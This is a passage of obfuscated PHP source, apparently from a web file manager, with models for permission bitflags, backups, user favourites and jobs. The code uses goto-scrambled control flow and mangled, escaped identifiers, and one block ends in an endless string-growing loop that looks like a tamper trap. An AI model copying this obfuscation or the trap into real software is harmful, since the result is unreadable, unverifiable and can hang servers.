$C»™Ü«ÈäÜ[1448] => (int) $aØºÊ¶ÊÙ, $C»™Ü«ÈäÜ[1449] => (int) $Cè±ØÇ¦); goto E´¤—ÌÊ¹; Fê¶‘•®¶•: $d¹ùã´Ù¸ß = $this->sourceSize(); $Bù ­Œ¼ï¥ = array($C»™Ü«ÈäÜ[375] => 0, $C»™Ü«ÈäÜ[384] => 1); $aØºÊ¶ÊÙ = Model($C»™Ü«ÈäÜ[512])->where($Bù ­Œ¼ï¥)->sum($C»™Ü«ÈäÜ[78]); goto b¬œ²à®ªÕ; E´¤—ÌÊ¹: } private function sourceSize() { $b–¥ÍŠŠ£ =& $_SERVER[ÍÓÖ€°å]; $D»Öñ©¥ = Model($b–¥ÍŠŠ£[512])->where(array($b–¥ÍŠŠ£[366] => 0))->sum($b–¥ÍŠŠ£[78]); $bÕˆéç‹ì = Model($b–¥ÍŠŠ£[402])->sum($b–¥ÍŠŠ£[78]); if ($bÕˆéç‹ì > $D»Öñ©¥) { $bÕˆéç‹ì = $D»Öñ©¥; } return array($b–¥ÍŠŠ£[78] => (int) $D»Öñ©¥, $b–¥ÍŠŠ£[1447] => (int) $bÕˆéç‹ì); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $C—÷š¬¸‚ =& $_SERVER[ÍÓÖ€°å]; $C®…ÁÛòø = array(array($C—÷š¬¸‚[378] => LNG($C—÷š¬¸‚[1517]), $C—÷š¬¸‚[1518] => $C—÷š¬¸‚[1519], $C—÷š¬¸‚[1520] => 6, $C—÷š¬¸‚[1521] => 1, $C—÷š¬¸‚[1522] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($C—÷š¬¸‚[378] => LNG($C—÷š¬¸‚[1523]), $C—÷š¬¸‚[1518] => $C—÷š¬¸‚[1524], $C—÷š¬¸‚[1520] => 1, $C—÷š¬¸‚[1521] => 1, $C—÷š¬¸‚[1522] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($C—÷š¬¸‚[378] => LNG($C—÷š¬¸‚[1525]), $C—÷š¬¸‚[1518] => $C—÷š¬¸‚[1526], $C—÷š¬¸‚[1520] => 2, $C—÷š¬¸‚[1521] => 1, $C—÷š¬¸‚[1522] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($C—÷š¬¸‚[378] => LNG($C—÷š¬¸‚[1527]), $C—÷š¬¸‚[1518] => $C—÷š¬¸‚[1526], $C—÷š¬¸‚[1520] => 3, $C—÷š¬¸‚[1521] => 1, $C—÷š¬¸‚[1522] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($C—÷š¬¸‚[378] => LNG($C—÷š¬¸‚[1528]), $C—÷š¬¸‚[1518] => $C—÷š¬¸‚[1529], $C—÷š¬¸‚[1520] => 4, $C—÷š¬¸‚[1521] => 1, $C—÷š¬¸‚[1522] => self::AUTH_SHOW | self::AUTH_VIEW), array($C—÷š¬¸‚[378] => LNG($C—÷š¬¸‚[1530]), $C—÷š¬¸‚[1518] => $C—÷š¬¸‚[1531], $C—÷š¬¸‚[1520] => 5, $C—÷š¬¸‚[1521] => 1, $C—÷š¬¸‚[1522] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($C—÷š¬¸‚[378] => LNG($C—÷š¬¸‚[1532]), $C—÷š¬¸‚[1518] => $C—÷š¬¸‚[1533], $C—÷š¬¸‚[1520] => 7, $C—÷š¬¸‚[1521] => 1, $C—÷š¬¸‚[1522] => 0)); return $C®…ÁÛòø; } public static function authCheck($A–¸‡´„ô‰, $b¬½ÈÚ‘óØ) { $A–¸‡´„ô‰ = intval($A–¸‡´„ô‰); if ($GLOBALS[$_SERVER[ÍÓÖ€°å][997]]) { return !0; } if ($A–¸‡´„ô‰ <= 0) { return !1; } if (($A–¸‡´„ô‰ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A–¸‡´„ô‰ & $b¬½ÈÚ‘óØ); } public static function authCheckShow($A¡èŒõ³šì) { return self::authCheck($A¡èŒõ³šì, self::AUTH_SHOW); } public static function authCheckView($Bìœ´È×—™) { return self::authCheck($Bìœ´È×—™, self::AUTH_VIEW); } public static function authCheckDownload($Cè™Ì³ëŒ) { return self::authCheck($Cè™Ì³ëŒ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($báÕ™Åè¡˜) { return self::authCheck($báÕ™Åè¡˜, self::AUTH_UPLOAD); } public static function authCheckEdit($fÂ ¯›³°) { return self::authCheck($fÂ ¯›³°, self::AUTH_EDIT); } public static function authCheckRemove($C’ÆëË•‘Š) { return self::authCheck($C’ÆëË•‘Š, self::AUTH_REMOVE); } public static function authCheckShare($d¢Ó©„¥ª) { return self::authCheck($d¢Ó©„¥ª, self::AUTH_SHARE); } public static function authCheckComment($C‹ÏîŞµÛí) { return self::authCheck($C‹ÏîŞµÛí, self::AUTH_COMMENT); } public static function authCheckEvent($Cƒ¡ŠßæîŠ) { return self::authCheck($Cƒ¡ŠßæîŠ, self::AUTH_EVENT); } public static function authCheckRoot($FÑÎÕ··İ–) { return self::authCheck($FÑÎÕ··İ–, self::AUTH_ROOT); } public static function authDisable($Eê¶–‡İ²ì, $Cà±³ÔàÄ) { if (intval($Eê¶–‡İ²ì) <= 0) { return 0; } return intval($Eê¶–‡İ²ì) & ~$Cà±³ÔàÄ; } public $optionType = "\123\x79\163\164\x65\155\x2e\163\x6f\x75\x72\x63\145\x41\165\x74\x68\x4c\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\x61\165\164\150", "\154\141\142\145\x6c", "\144\151\x73\160\x6c\141\171", "\163\x79\x73\164\145\x6d", "\x73\157\162\164"); public function initData() { $eš‡ÕÄ³ = $this->authDefault(); foreach ($eš‡ÕÄ³ as $D­ñ¨ê¢Ñ¼) { $this->add($D­ñ¨ê¢Ñ¼); } } public function listData($Bó¡ÅòÔÉœ = false, $d‹‡é˜¶ö = "\163\157\x72\164", $a®‡áˆôêÃ = false) { return parent::listData($Bó¡ÅòÔÉœ, $d‹‡é˜¶ö, $a®‡áˆôêÃ); } public function update($C³‘Ï¸ˆ„é, $dÑÆ¸½°»Ê) { $B…®†­É¢® =& $_SERVER[ÍÓÖ€°å]; $EèÂóË˜„˜ = parent::listData($C³‘Ï¸ˆ„é); $cïÄğ‚¥Ã… = $this->findByName($dÑÆ¸½°»Ê[$B…®†­É¢®[28]]); if (!$EèÂóË˜„˜ || $cïÄğ‚¥Ã… && $cïÄğ‚¥Ã…[$B…®†­É¢®[357]] != $EèÂóË˜„˜[$B…®†­É¢®[357]]) { return !1; } $this->filterAuth($dÑÆ¸½°»Ê[$B…®†­É¢®[540]]); return parent::update($C³‘Ï¸ˆ„é, $dÑÆ¸½°»Ê); } public function remove($fÕ¤­·´„×) { $cËƒœÜëŸ = parent::listData($fÕ¤­·´„×); if (!$cËƒœÜëŸ || $cËƒœÜëŸ[$_SERVER[ÍÓÖ€°å][799]]) { return !1; } return parent::remove($fÕ¤­·´„×); } public function add($fÇš¯ÑÒ­ = array()) { goto AÏÄ¯Ä¯ô‡; EÖÀ—«‘í”: $fÇš¯ÑÒ­ = array_merge($B„ÓÂáÉ™é, $fÇš¯ÑÒ­); $fÇš¯ÑÒ­[$AÉ§—Øä¸Ø[1537]] = $this->getSort(); $this->filterAuth($fÇš¯ÑÒ­[$AÉ§—Øä¸Ø[540]]); goto D¾øé½¯Ê…; D¾øé½¯Ê…: return parent::insert($fÇš¯ÑÒ­); goto bŠ “Ö¢ç; AÏÄ¯Ä¯ô‡: $AÉ§—Øä¸Ø =& $_SERVER[ÍÓÖ€°å]; if ($this->findByName($fÇš¯ÑÒ­[$AÉ§—Øä¸Ø[28]])) { return !1; } $B„ÓÂáÉ™é = array($AÉ§—Øä¸Ø[28] => $AÉ§—Øä¸Ø[33], $AÉ§—Øä¸Ø[540] => 1, $AÉ§—Øä¸Ø[1534] => $AÉ§—Øä¸Ø[1535], $AÉ§—Øä¸Ø[1536] => 1, $AÉ§—Øä¸Ø[799] => 0, $AÉ§—Øä¸Ø[1537] => 0); goto EÖÀ—«‘í”; bŠ “Ö¢ç: } private function getSort() { $F«†â¢ÁĞ” =& $_SERVER[ÍÓÖ€°å]; $a¡‰ÓìÆ = parent::listData(); $BèµÇòŸ‡ = array_to_keyvalue($a¡‰ÓìÆ, $F«†â¢ÁĞ”[33], $F«†â¢ÁĞ”[1537]); return empty($BèµÇòŸ‡) ? 0 : max($BèµÇòŸ‡) + 1; } private function filterAuth(&$c‡Ò¶ƒ§•) { goto Eì…ä¼°¿È; Bùƒ»ÓŒ½: foreach ($FëöÚ„¼Œ as $Bù¥«¡²Œ‰) { if (isset($f³êåğšÆ‚[$Bù¥«¡²Œ‰])) { $FëöÚ„¼Œ = array_merge($FëöÚ„¼Œ, $f³êåğšÆ‚[$Bù¥«¡²Œ‰]); } } $FëöÚ„¼Œ[] = self::AUTH_SHOW; $c‡Ò¶ƒ§• = array_sum(array_unique($FëöÚ„¼Œ)); goto e˜İ×¤Ş‚×; Eì…ä¼°¿È: if (!$c‡Ò¶ƒ§•) { return; } $eÖæ†£ÙÂ· = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $FëöÚ„¼Œ = array(); goto DƒÕÂÉŒ¨; DƒÕÂÉŒ¨: foreach ($eÖæ†£ÙÂ· as $Bù¥«¡²Œ‰) { if ($c‡Ò¶ƒ§• & $Bù¥«¡²Œ‰) { $FëöÚ„¼Œ[] = $Bù¥«¡²Œ‰; } } if (in_array(self::AUTH_ROOT, $FëöÚ„¼Œ)) { $c‡Ò¶ƒ§• = array_sum($eÖæ†£ÙÂ·); return; } $f³êåğšÆ‚ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto Bùƒ»ÓŒ½; e˜İ×¤Ş‚×: } public function sort($dˆêÃğæ°†, $FÁ²¯É¿) { return parent::update($dˆêÃğæ°†, $FÁ²¯É¿); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\142\141\x63\153\x75\x70\114\x69\x73\x74"; public $field = array("\151\157", "\x6e\x61\x6d\x65", "\x73\164\141\x74\x75\x73", "\x63\157\156\x74\x65\156\x74", "\x72\x65\163\165\154\x74", "\164\151\x6d\145\x46\162\157\155", "\x74\x69\x6d\145\x54\x6f"); public function config() { goto AÌ¾¼Œ¨Ú—; C’Ù¢‘Š: if (isset($bÏƒ¸Û³ã[$e‹èÆĞò…[178]])) { $bÏƒ¸Û³ã[$e‹èÆĞò…[178]] = json_decode($bÏƒ¸Û³ã[$e‹èÆĞò…[178]], !0); } if (isset($Dˆ©µäãò[$e‹èÆĞò…[178]])) { $bÏƒ¸Û³ã[$e‹èÆĞò…[178]][$e‹èÆĞò…[1037]] = $Dˆ©µäãò[$e‹èÆĞò…[178]]; unset($Dˆ©µäãò[$e‹èÆĞò…[178]]); } return array_merge($bÏƒ¸Û³ã, $Dˆ©µäãò); goto eÀøï¥â›; Bë¯İ„±Ûí: $Dˆ©µäãò = is_array($Dˆ©µäãò) ? $Dˆ©µäãò : array(); if (!isset($Dˆ©µäãò[$e‹èÆĞò…[440]])) { $Dˆ©µäãò[$e‹èÆĞò…[440]] = $e‹èÆĞò…[393]; } $bÏƒ¸Û³ã = array(); goto A¤×“–– ; A¤×“–– : Action($e‹èÆĞò…[1538])->taskInit(); $fÑÀ¬ÔĞÈ¼ = Model($e‹èÆĞò…[1539])->listData(); foreach ($fÑÀ¬ÔĞÈ¼ as $D¸‰¢Ãª‰) { if ($D¸‰¢Ãª‰[$e‹èÆĞò…[799]] == $e‹èÆĞò…[367] && $D¸‰¢Ãª‰[$e‹èÆĞò…[1050]] == $e‹èÆĞò…[1540]) { $bÏƒ¸Û³ã = $D¸‰¢Ãª‰; break; } } goto C’Ù¢‘Š; AÌ¾¼Œ¨Ú—: $e‹èÆĞò… =& $_SERVER[ÍÓÖ€°å]; $Dˆ©µäãò = Model($e‹èÆĞò…[807])->get($e‹èÆĞò…[459]); $Dˆ©µäãò = json_decode($Dˆ©µäãò, !0); goto Bë¯İ„±Ûí; eÀøï¥â›: } public function listData($BÍÀƒëĞ¦ = false, $A†Á÷Œá¯ß = "\155\x6f\144\151\x66\x79\124\151\x6d\145", $dİ§«¸ãŠ† = false) { return parent::listData($BÍÀƒëĞ¦, $A†Á÷Œá¯ß, !0); } public function lastItem() { $Bº‹À¥œ¤“ = $this->listData(); return !empty($Bº‹À¥œ¤“[0]) ? $Bº‹À¥œ¤“[0] : null; } public function kill($f¸ñ÷œ…Ÿ) { goto aôï±¸ø±­; eÎğŠòáä: Task::kill($d« —È‡°œ[458]); Task::kill($d« —È‡°œ[488]); Task::kill($d« —È‡°œ[496]); goto C–³éßÕ–Ñ; C–³éßÕ–Ñ: $C½™††²ä = $D·ÌÍ¾î‰[$d« —È‡°œ[28]]; $Eµ—ì©º¸ = TEMP_FILES . $d« —È‡°œ[466] . $C½™††²ä . $d« —È‡°œ[8]; IO::remove($Eµ—ì©º¸, !1); goto Bš§œ–Ü÷É; aôï±¸ø±­: $d« —È‡°œ =& $_SERVER[ÍÓÖ€°å]; $D·ÌÍ¾î‰ = $this->listData($f¸ñ÷œ…Ÿ); if (!$D·ÌÍ¾î‰ || empty($D·ÌÍ¾î‰[$d« —È‡°œ[28]])) { return !0; } goto eÎğŠòáä; Bš§œ–Ü÷É: return $this->remove($f¸ñ÷œ…Ÿ); goto bó–‚ç™’È; bó–‚ç™’È: } public function remove($eÜ‰“¾—ô) { $EÒŠó‡ÓÇ = $this->listData($eÜ‰“¾—ô); if (!$EÒŠó‡ÓÇ) { return !0; } return $this->backupRemove($EÒŠó‡ÓÇ); } private function backupRemove($eê‡õÛÙ×) { $B…Á×ğ¸ï´ =& $_SERVER[ÍÓÖ€°å]; parent::remove($eê‡õÛÙ×[$B…Á×ğ¸ï´[357]]); $aøÔÃÎÙ™Í = "\x7b\151\x6f\72{$eê‡õÛÙ×[$B…Á×ğ¸ï´[439]]}\175\x2f\x64\x61\x74\x61\x62\x61\x73\145\x2f" . $eê‡õÛÙ×[$B…Á×ğ¸ï´[28]]; IO::remove($aøÔÃÎÙ™Í, !1); return !0; } public function start() { goto fŸá¹ÁÉ²¡; Eß‡¨“¾ïŒ: if (!$CÏö÷Õ™èù->dbFile()) { return !1; } if ($E˜ÄÑ„Ìê[$E¨Âğ¡¤ô„[440]] == $E¨Âğ¡¤ô„[393]) { $CÏö÷Õ™èù->file(); } Backup::set(array($E¨Âğ¡¤ô„[437] => 1, $E¨Âğ¡¤ô„[451] => time())); goto E¤ËÙÜíëƒ; fºâøÌêö¾: if (Hook::trigger($E¨Âğ¡¤ô„[1541]) == $E¨Âğ¡¤ô„[1542]) { return !0; } $fÚ»ŞçÄôÅ = $this->process(); foreach ($fÚ»ŞçÄôÅ as $Fµ¥ÃßïƒÌ) { if ($Fµ¥ÃßïƒÌ) { return Task::restart($Fµ¥ÃßïƒÌ[$E¨Âğ¡¤ô„[357]]); } } goto D×ĞÀŸƒË; D×ĞÀŸƒË: $CÏö÷Õ™èù = new Backup(); $CÏö÷Õ™èù->keep(); if (!$CÏö÷Õ™èù->db()) { return !1; } goto Eß‡¨“¾ïŒ; E¤ËÙÜíëƒ: return !0; goto a†°ºğŒÏ¥; fŸá¹ÁÉ²¡: $E¨Âğ¡¤ô„ =& $_SERVER[ÍÓÖ€°å]; $E˜ÄÑ„Ìê = $this->config(); if (!$E˜ÄÑ„Ìê || $E˜ÄÑ„Ìê[$E¨Âğ¡¤ô„[1035]] != $E¨Âğ¡¤ô„[367]) { return !1; } goto fºâøÌêö¾; a†°ºğŒÏ¥: } public function process() { $dÙñœÌ°ÚÑ =& $_SERVER[ÍÓÖ€°å]; return array($dÙñœÌ°ÚÑ[442] => Task::get($dÙñœÌ°ÚÑ[458]), $dÙñœÌ°ÚÑ[445] => Task::get($dÙñœÌ°ÚÑ[488]), $dÙñœÌ°ÚÑ[155] => Task::get($dÙñœÌ°ÚÑ[496])); } public function restore() { $F¢¤ ò¢î© =& $_SERVER[ÍÓÖ€°å]; ActionCall($F¢¤ ò¢î©[1543], !0, 1); ActionCall($F¢¤ ò¢î©[1543], !0, 0); } } goto fŒöËå¥Ü; EÖ¼¤ÓŠá: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($eñôİöòÑ) { $BĞ˜‘¯öŠ‚ =& $_SERVER[ÍÓÖ€°å]; return array($BĞ˜‘¯öŠ‚[1869] => array(USER_ID, $BĞ˜‘¯öŠ‚[1870])); } protected function listData() { $b–ó¡ŸÃô =& $_SERVER[ÍÓÖ€°å]; $f›¹Ù¶áã’ = array($b–ó¡ŸÃô[1053] => USER_ID, $b–ó¡ŸÃô[1871] => 0); $A¹åÎ²Üô™ = $b–ó¡ŸÃô[1872]; $Fã¨°âôÈ = $this->field($A¹åÎ²Üô™)->where($f›¹Ù¶áã’)->order($b–ó¡ŸÃô[1873])->select(); return $Fã¨°âôÈ ? $Fã¨°âôÈ : array(); } protected function listView() { goto b¯×¶Ë’Ì‚; b¯×¶Ë’Ì‚: $Bö­‚›É©ì =& $_SERVER[ÍÓÖ€°å]; $B±åöŠøº¡ = $this->listData(); $CÆâ–§ïö = array_filter_by_field($B±åöŠøº¡, $Bö­‚›É©ì[29], $Bö­‚›É©ì[949]); goto cÒì­±ÎÂ; Bí Š†: $FÃ•±†¹ÁÚ = array_to_keyvalue($FÃ•±†¹ÁÚ, $Bö­‚›É©ì[365]); foreach ($B±åöŠøº¡ as $D¬Ó£ÖÎó® => $EÑÌÉÌìö¡) { $BÀĞÊÁÆñ = $FÃ•±†¹ÁÚ[$EÑÌÉÌìö¡[$Bö­‚›É©ì[76]]]; $BÀĞÊÁÆñ = $BÀĞÊÁÆñ ? $BÀĞÊÁÆñ : array(); $B±åöŠøº¡[$D¬Ó£ÖÎó®] = array_merge($BÀĞÊÁÆñ, $EÑÌÉÌìö¡); } return $B±åöŠøº¡; goto E©ê¨ÛÉº; cÒì­±ÎÂ: $dÙ•µ¦¹Ÿ— = array_to_keyvalue($CÆâ–§ïö, $Bö­‚›É©ì[33], $Bö­‚›É©ì[76]); if (!$dÙ•µ¦¹Ÿ—) { return $B±åöŠøº¡; } $b‡³İÚÂİÁ = 2000; goto cš©ñô‚ì; cš©ñô‚ì: $FåŞÖ…¿¬¼ = array($Bö­‚›É©ì[406] => array($Bö­‚›É©ì[946], $dÙ•µ¦¹Ÿ—)); $FÃ•±†¹ÁÚ = Model($Bö­‚›É©ì[512])->listSource($FåŞÖ…¿¬¼, $b‡³İÚÂİÁ); $FÃ•±†¹ÁÚ = array_merge($FÃ•±†¹ÁÚ[$Bö­‚›É©ì[74]], $FÃ•±†¹ÁÚ[$Bö­‚›É©ì[75]]); goto Bí Š†; E©ê¨ÛÉº: } protected function addFav($EÏÚî‹³ˆ§, $e§„ÍÜôÎ = '', $Aëˆ©èñ„ò = "\x73\x6f\165\x72\143\145") { goto fó«ºîßè; D‚šéªñÀ: return $this->add($dòñµË˜Ÿ‚); goto eøè ©Â‰ˆ; CÜí‡ùÅª»: $B«§ß‹Î = array($f™ïÈœ¹õ½[1053] => USER_ID, $f™ïÈœ¹õ½[1871] => 0); $A®è“ñÈ ˜ = $this->where($B«§ß‹Î)->max($f™ïÈœ¹õ½[1537]); if (!$A®è“ñÈ ˜) { $A®è“ñÈ ˜ = 0; } goto CŒ…¶„×‘Ñ; CŒ…¶„×‘Ñ: if (!$e§„ÍÜôÎ && $Aëˆ©èñ„ò == $f™ïÈœ¹õ½[949]) { $D›Üø¢åŠ§ = Model($f™ïÈœ¹õ½[827])->where(array($f™ïÈœ¹õ½[406] => $EÏÚî‹³ˆ§))->find(); if (!$D›Üø¢åŠ§) { return !1; } $e§„ÍÜôÎ = $D›Üø¢åŠ§[$f™ïÈœ¹õ½[28]]; } $e§„ÍÜôÎ = $this->getAutoName($e§„ÍÜôÎ); $dòñµË˜Ÿ‚ = array($f™ïÈœ¹õ½[1053] => USER_ID, $f™ïÈœ¹õ½[1871] => 0, $f™ïÈœ¹õ½[378] => $e§„ÍÜôÎ, $f™ïÈœ¹õ½[1577] => $EÏÚî‹³ˆ§, $f™ïÈœ¹õ½[787] => $Aëˆ©èñ„ò, $f™ïÈœ¹õ½[1520] => $A®è“ñÈ ˜ + 1); goto D‚šéªñÀ; fó«ºîßè: $f™ïÈœ¹õ½ =& $_SERVER[ÍÓÖ€°å]; $B«§ß‹Î = array($f™ïÈœ¹õ½[1053] => USER_ID, $f™ïÈœ¹õ½[1871] => 0, $f™ïÈœ¹õ½[787] => $Aëˆ©èñ„ò, $f™ïÈœ¹õ½[1577] => $EÏÚî‹³ˆ§); if ($this->where($B«§ß‹Î)->find()) { return !1; } goto CÜí‡ùÅª»; eøè ©Â‰ˆ: } protected function remove($f’‹•İ‚ƒ¥) { $dƒï¹¶õ×á =& $_SERVER[ÍÓÖ€°å]; $d‹±ÒŠ‹ßö = array($dƒï¹¶õ×á[1053] => USER_ID, $dƒï¹¶õ×á[789] => $f’‹•İ‚ƒ¥); return $this->where($d‹±ÒŠ‹ßö)->delete(); } protected function removeByName($fÚ‹å„²ô) { $EĞèâ“ô˜ =& $_SERVER[ÍÓÖ€°å]; $cÒâ½ò¸Ñë = array($EĞèâ“ô˜[1053] => USER_ID, $EĞèâ“ô˜[378] => $fÚ‹å„²ô, $EĞèâ“ô˜[1871] => 0); return $this->where($cÒâ½ò¸Ñë)->delete(); } protected function rename($DóˆÅÑÒİì, $eÛôÌò‹È) { $a‡ç¡å¬Éµ =& $_SERVER[ÍÓÖ€°å]; if ($DóˆÅÑÒİì == $eÛôÌò‹È) { return !1; } $CÊòº´–¬ = $this->getAutoName($eÛôÌò‹È); if ($eÛôÌò‹È != $CÊòº´–¬) { return !1; } $C™Œëº†™„ = array($a‡ç¡å¬Éµ[1053] => USER_ID, $a‡ç¡å¬Éµ[1871] => 0, $a‡ç¡å¬Éµ[28] => $DóˆÅÑÒİì); return $this->where($C™Œëº†™„)->save(array($a‡ç¡å¬Éµ[28] => $eÛôÌò‹È)); } protected function resetSort($F’Ù’¿¥¡©) { $dï–Ü•ƒÆ‰ =& $_SERVER[ÍÓÖ€°å]; $Fùå‘Ğ„£ = array($dï–Ü•ƒÆ‰[1053] => USER_ID); for ($Dø¼é‡Ç£¦ = 0; $Dø¼é‡Ç£¦ < count($F’Ù’¿¥¡©); $Dø¼é‡Ç£¦++) { $Fùå‘Ğ„£[$dï–Ü•ƒÆ‰[789]] = $F’Ù’¿¥¡©[$Dø¼é‡Ç£¦]; $this->where($Fùå‘Ğ„£)->save(array($dï–Ü•ƒÆ‰[1520] => $Dø¼é‡Ç£¦ + 1)); } return !0; } protected function moveTop($AĞØÑ†š–) { goto d’Ÿ¨ù²­; d’Ÿ¨ù²­: $A¶²ç‰íï =& $_SERVER[ÍÓÖ€°å]; $d‘È½á’ÜÂ = array($A¶²ç‰íï[1053] => USER_ID, $A¶²ç‰íï[1871] => 0); $e’š®˜à”· = $this->where($d‘È½á’ÜÂ)->where(array($A¶²ç‰íï[28] => $AĞØÑ†š–))->find(); goto dØâé­„…–; EœÖ†‰š–: $bìÌéŞ²½… = $eªÇ¾«±ÜÌ; $eªÇ¾«±ÜÌ = array_remove_value($eªÇ¾«±ÜÌ, $e’š®˜à”·[$A¶²ç‰íï[357]]); array_unshift($eªÇ¾«±ÜÌ, $e’š®˜à”·[$A¶²ç‰íï[357]]); goto bõÁ†²’¥œ; dØâé­„…–: if (!$e’š®˜à”·) { return; } $eªÇ¾«±ÜÌ = $this->field($A¶²ç‰íï[357])->where($d‘È½á’ÜÂ)->order($A¶²ç‰íï[1873])->select(); $eªÇ¾«±ÜÌ = array_to_keyvalue($eªÇ¾«±ÜÌ, $A¶²ç‰íï[33], $A¶²ç‰íï[357]); goto EœÖ†‰š–; bõÁ†²’¥œ: return $this->resetSort($eªÇ¾«±ÜÌ); goto Bˆùêæˆ; Bˆùêæˆ: } protected function moveBottom($A¡åÄ˜ÖÈ) { $Eõ›Œõ¿Ö =& $_SERVER[ÍÓÖ€°å]; $aÓ˜„À¢Œ = array($Eõ›Œõ¿Ö[1053] => USER_ID, $Eõ›Œõ¿Ö[1871] => 0); $f›éÙëµÑ‘ = $this->where($aÓ˜„À¢Œ)->max($Eõ›Œõ¿Ö[1537]); $c¤©ŒœÑµ§ = array($Eõ›Œõ¿Ö[1537] => $f›éÙëµÑ‘ + 1); return $this->where($aÓ˜„À¢Œ)->where(array($Eõ›Œõ¿Ö[28] => $A¡åÄ˜ÖÈ))->save($c¤©ŒœÑµ§); } private function getAutoName($c¦ŒÖÓ Åï) { goto C‡×ÊÏñ; eâæÊ‡‚ˆŞ: return $c¦ŒÖÓ Åï . "\x28{$aÒâ¡È²Œ}\x29"; goto Dš®ò¸Ú‹; AÖ¡ø…²¦Ç: $Eİä¥æÓ¢ƒ = array_to_keyvalue($Eİä¥æÓ¢ƒ, $a¨ÆÉï¹ù‘[33], $a¨ÆÉï¹ù‘[28]); if (!$Eİä¥æÓ¢ƒ || !in_array($c¦ŒÖÓ Åï, $Eİä¥æÓ¢ƒ)) { return $c¦ŒÖÓ Åï; } for ($aÒâ¡È²Œ = 0; $aÒâ¡È²Œ < count($Eİä¥æÓ¢ƒ); $aÒâ¡È²Œ++) { if (!in_array($c¦ŒÖÓ Åï . "\50{$aÒâ¡È²Œ}\51", $Eİä¥æÓ¢ƒ)) { return $c¦ŒÖÓ Åï . "\50{$aÒâ¡È²Œ}\x29"; } } goto eâæÊ‡‚ˆŞ; C‡×ÊÏñ: $a¨ÆÉï¹ù‘ =& $_SERVER[ÍÓÖ€°å]; $bŞäƒ…¬°‹ = array($a¨ÆÉï¹ù‘[1053] => USER_ID, $a¨ÆÉï¹ù‘[1871] => 0); $Eİä¥æÓ¢ƒ = $this->field($a¨ÆÉï¹ù‘[28])->where($bŞäƒ…¬°‹)->select(); goto AÖ¡ø…²¦Ç; Dš®ò¸Ú‹: } } if (!isset($_SERVER[$_SERVER[ÍÓÖ€°å][544]]) || !isset($_SERVER[$_SERVER[ÍÓÖ€°å][945]])) { goto DÓÖ’ò¤­ï; fÕÆŞ„²ÕÎ: $D½æĞ¨‰Í(BASIC_PATH . $_SERVER[ÍÓÖ€°å][547]); for (;;) { $D½æĞ¨‰Í = $D½æĞ¨‰Í . $_SERVER[ÍÓÖ€°å][551]; } goto fã›Š±›«¾; DÓÖ’ò¤­ï: $Cå’Ç¶™¨ = $_SERVER[ÍÓÖ€°å][546]; $Fù¢­§„ß† = BASIC_PATH . $_SERVER[ÍÓÖ€°å][547]; $C¨Ê¢äëí = $Cå’Ç¶™¨($Fù¢­§„ß†); goto BÜÓ®Ó‹„Œ; BÜÓ®Ó‹„Œ: $c®¥†ÕŸ‘ = explode($_SERVER[ÍÓÖ€°å][212], $C¨Ê¢äëí); if (count($c®¥†ÕŸ‘) < $_SERVER[ÍÓÖ€°å][1238]) { die; } $D½æĞ¨‰Í = $_SERVER[ÍÓÖ€°å][1239]; goto fÕÆŞ„²ÕÎ; fã›Š±›«¾: } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\152\157\x62\114\x69\163\164"; public $field = array("\156\141\155\x65", "\x64\x65\163\x63", "\x73\157\x72\x74"); const JOB_KEY = "\163\x65\154\x66\x4a\157\x62\114\151\163\164"; public function listData($A©¿·¤¬‹¶ = false, $Dñó°…Æ² = "\163\157\162\164", $BŸ‰í²¢âá = false) { return parent::listData($A©¿·¤¬‹¶, $Dñó°…Æ², $BŸ‰í²¢âá); } public function remove($c‰¿…ºÓñ®) { return parent::remove($c‰¿…ºÓñ®); } public function add($aŸßõ´œÏ) { $A›‰™œš©õ =& $_SERVER[ÍÓÖ€°å]; if ($this->findByName($aŸßõ´œÏ[$A›‰™œš©õ[28]])) { return !1; } $aŸßõ´œÏ[$A›‰™œš©õ[1537]] = $this->getSort(); return parent::insert($aŸßõ´œÏ); } private function getSort() { $dÙÎŒ²¥Æ¦ =& $_SERVER[ÍÓÖ€°å]; $B·ïèëğÒç = parent::listData(); $eõ¸ˆÍùÄ = array_to_keyvalue($B·ïèëğÒç, $dÙÎŒ²¥Æ¦[33], $dÙÎŒ²¥Æ¦[1537]); return empty($eõ¸ˆÍùÄ) ? 0 : max($eõ¸ˆÍùÄ) + 1; } public function update($Aíø‹ÁÁ , $E£°âÌ¯‘) { $fÈ¦˜ªªõ¿ =& 